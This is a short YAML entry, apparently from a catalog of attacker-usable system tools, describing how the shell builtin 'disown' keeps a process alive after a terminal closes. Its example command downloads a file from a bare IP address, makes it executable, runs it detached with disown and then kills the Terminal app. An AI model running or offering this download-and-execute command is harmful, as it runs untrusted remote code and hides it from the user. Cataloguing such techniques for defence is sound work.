...
name: disown
description: Prevents a process from being terminated when a shell session or terminal
  is closed.
...
execution:
  ...
  shell: false
examples:
- description: 'Start a process and remove it from the jobs table.: The following
  ...
  command: curl -O http://1.1.1.1/updated && chmod +x updated && ./updated & disown
    && pkill Terminal
install:
- method: custom
  commands:
